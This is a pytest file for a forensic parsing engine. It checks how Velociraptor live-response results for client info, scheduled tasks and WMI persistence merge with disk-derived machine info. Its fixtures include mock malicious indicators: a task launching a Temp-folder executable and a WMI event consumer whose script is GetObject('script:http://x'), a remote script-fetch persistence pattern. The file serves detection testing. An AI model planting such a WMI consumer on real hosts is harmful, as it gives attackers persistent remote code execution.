"""v0.7.161: a live response collected with the disk does not repeat what the disk
parsers already hold -- its client info goes into machine_info, its scheduled tasks
and WMI subscriptions stay in tasks_disk / wmi_persistence -- and a live response
collected on its own keeps all three, being their only source."""
from __future__ import annotations

import json

from artifact_engine.core.runner import ParserContext
from artifact_engine.handlers import win_liveresponse_velociraptor as lr
from artifact_engine.handlers import win_systeminfo
from tests.test_parsing import _write_lr

_CLIENT = [
    {"Hostname": "HOST-01", "Fqdn": "host-01.example.local", "Architecture": "amd64",
     "KernelVersion": "10.0.17763", "MACAddresses": ["00:11:22:33:44:55"]},
    {"Param": "BootTime", "Value": 1767225600},
    {"Param": "LocalTZ", "Value": "Romance Standard Time"},
    {"Param": "LocalTZOffset", "Value": 3600},
    {"Param": "Exe", "Value": "C:\\tools\\collector.exe"},          # the collector's own
    {"Computer Info": {"Domain": "example.local", "DomainRole": "MemberServer",
                       "TotalPhysicalMemory": "17179869184"},
     "Network Info": {"Caption": "nic0", "IPAddresses": "10.0.0.5", "IPSubnet": "255.255.255.0",
                      "DefaultIPGateway": "10.0.0.1", "DNSServerSearchOrder": "10.0.0.2"}},
    {"Name": "jdoe", "Description": "", "LastLogin": "2026-01-02T03:04:05Z"},
]


def _collection(tmp_path, disk: bool):
    results = tmp_path / "Velociraptor" / "LiveResponse" / "results"
    results.mkdir(parents=True)
    evidence = tmp_path / "C"
    if disk:
        (evidence / "Windows" / "System32" / "config").mkdir(parents=True)
        (evidence / "Windows" / "System32" / "config" / "SYSTEM").write_bytes(b"regf")
    else:
        evidence.mkdir()
    _write_lr(results, "Generic.Client.Info", _CLIENT)
    _write_lr(results, "Windows.System.TaskScheduler", [
        {"TaskName": "\\Evil", "Command": "x",
         "_XML": {"Task": {"Actions": {"Exec": {"Command": "C:\\Users\\b\\AppData\\Local\\Temp\\p.exe"}}}}}])
    _write_lr(results, "Windows.Persistence.PermanentWMIEvents", [
        {"Namespace": "root/subscription",
         "ConsumerDetails": {"Name": "EvilASEC", "ScriptText": "GetObject('script:http://x')"}}])
    _write_lr(results, "Windows.System.Pslist", [
        {"Pid": 1000, "Name": "p.exe", "Exe": "C:\\Users\\b\\Downloads\\p.exe", "CommandLine": "p.exe"}])
    ctx = ParserContext(evidence=evidence, out=tmp_path / "JSONs", tools=tmp_path,
                        assets=tmp_path, machine_name="HOST-01", volume="C", log=None)
    lr.run(ctx)
    return tmp_path / "JSONs", evidence


def test_with_the_disk_the_three_duplicates_are_not_written(tmp_path):
    out, _ = _collection(tmp_path, disk=True)
    written = {p.name for p in out.glob("*.json")}
    assert "processes.json" in written
    assert not {"client_info.json", "scheduled_tasks.json", "wmi_persistence.json"} & written
    susp = json.loads((out / "suspicious.json").read_text(encoding="utf-8"))
    assert {f["artifact"] for f in susp["findings"]} == {"processes"}  # the disk tables flag them


def test_a_live_response_on_its_own_keeps_them(tmp_path):
    out, _ = _collection(tmp_path, disk=False)
    written = {p.name for p in out.glob("*.json")}
    assert {"client_info.json", "scheduled_tasks.json", "wmi_persistence.json"} <= written
    susp = json.loads((out / "suspicious.json").read_text(encoding="utf-8"))
    assert {"scheduled_tasks", "wmi_persistence"} <= {f["artifact"] for f in susp["findings"]}


def test_machine_info_takes_what_the_client_info_adds(tmp_path):
    _, evidence = _collection(tmp_path, disk=True)
    live = win_systeminfo._live(win_systeminfo._client_info(evidence))
    assert live["fqdn"] == "host-01.example.local"
    assert live["domain_role"] == "MemberServer" and live["memory_bytes"] == "17179869184"
    assert live["boot_time_utc"] == "2026-01-01 00:00:00"
    assert live["timezone"] == "Romance Standard Time" and live["timezone_offset_s"] == 3600
    assert live["interfaces"]["nic0"]["gateway"] == "10.0.0.1"
    assert live["local_accounts"]["jdoe"]["last_login"] == "2026-01-02T03:04:05Z"
    assert "collector.exe" not in json.dumps(live)                  # the collector, not the host

    # through the handler: the hives win where both answer, the live view fills gaps
    out = tmp_path / "SystemInfo"
    win_systeminfo.run(ParserContext(evidence=evidence, out=out, tools=tmp_path, assets=tmp_path,
                                     machine_name="HOST-01", volume="C", log=None))
    info = json.loads((out / "machine_info.json").read_text(encoding="utf-8"))
    assert info["timezone"] == "Romance Standard Time"
    # a snapshot is not the host's live state
    snap = tmp_path / "SnapInfo"
    win_systeminfo.run(ParserContext(evidence=evidence, out=snap, tools=tmp_path, assets=tmp_path,
                                     machine_name="HOST-01", volume="VSS1", log=None))
    assert "timezone" not in json.loads((snap / "machine_info.json").read_text(encoding="utf-8"))


def test_the_hives_win_where_both_answer(tmp_path, monkeypatch):
    _, evidence = _collection(tmp_path, disk=True)
    monkeypatch.setattr(win_systeminfo, "_open", lambda path: object())
    monkeypatch.setattr(win_systeminfo, "_os_info", lambda hive: {})
    monkeypatch.setattr(win_systeminfo, "_users", lambda hive: {})
    monkeypatch.setattr(win_systeminfo, "_computer_name", lambda hive: "HOST-01")
    monkeypatch.setattr(win_systeminfo, "_ips", lambda hive: ["10.0.0.5"])
    monkeypatch.setattr(win_systeminfo, "_domain", lambda hive: {
        "domain": "corp.example.local", "fqdn": "HOST-01.corp.example.local"})
    out = tmp_path / "SystemInfo"
    win_systeminfo.run(ParserContext(evidence=evidence, out=out, tools=tmp_path, assets=tmp_path,
                                     machine_name="HOST-01", volume="C", log=None))
    info = json.loads((out / "machine_info.json").read_text(encoding="utf-8"))
    assert info["fqdn"] == "HOST-01.corp.example.local"      # the hive's, not the live one
    assert info["domain"] == "corp.example.local"
    assert info["domain_role"] == "MemberServer"               # a gap the live view fills
